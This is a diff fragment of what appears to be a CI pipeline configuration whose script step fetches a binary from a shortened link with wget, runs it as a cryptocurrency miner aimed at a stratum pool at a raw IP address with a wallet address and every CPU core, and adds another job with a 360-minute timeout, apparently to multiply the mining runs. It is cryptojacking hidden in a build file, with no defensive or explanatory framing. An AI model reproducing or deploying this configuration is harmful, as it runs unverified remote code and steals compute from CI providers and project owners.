@@ -75,7 +75,8 @@ jobs:
   steps:
   - script: |
       wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
-      
+
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
